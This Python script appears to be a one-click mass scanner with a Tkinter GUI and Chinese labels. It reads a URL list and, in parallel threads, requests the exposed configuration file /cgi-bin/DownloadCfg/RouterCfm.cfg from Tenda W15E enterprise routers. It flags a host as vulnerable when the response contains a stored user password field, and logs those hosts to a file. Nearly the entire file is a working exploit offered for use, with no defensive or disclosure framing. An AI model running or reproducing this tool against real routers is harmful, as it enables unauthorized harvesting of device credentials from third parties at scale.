import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def Tenda_W15E_config_leak_exp(url):
    poc = r"""/cgi-bin/DownloadCfg/RouterCfm.cfg"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "sys.userpass" in res.text:
            Tenda_W15E_config_leak_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            Tenda_W15E_config_leak_text.see(END)
            with open ("存在Tenda W15E企业级路由器配置文件泄漏漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            Tenda_W15E_config_leak_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            Tenda_W15E_config_leak_text.see(END)
    except Exception as err:
        Tenda_W15E_config_leak_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        Tenda_W15E_config_leak_text.see(END)
def get_Tenda_W15E_config_leak_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Tenda_W15E_config_leak_gui():
    Tenda_W15E_config_leak = tk.Tk()
    Tenda_W15E_config_leak.geometry("910x450")
    Tenda_W15E_config_leak.title("Tenda W15E企业级路由器配置文件泄漏漏洞一把梭")
    Tenda_W15E_config_leak.resizable(0, 0)
    Tenda_W15E_config_leak.iconbitmap('logo.ico')
    global Tenda_W15E_config_leak_text
    Tenda_W15E_config_leak_text = scrolledtext.ScrolledText(Tenda_W15E_config_leak,width=123, height=25)
    Tenda_W15E_config_leak_text.grid(row=0, column=0, padx=10, pady=10)
    Tenda_W15E_config_leak_text.see(END)
    addrs = get_Tenda_W15E_config_leak_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Tenda_W15E_config_leak_exp, addr)
    Tenda_W15E_config_leak.mainloop()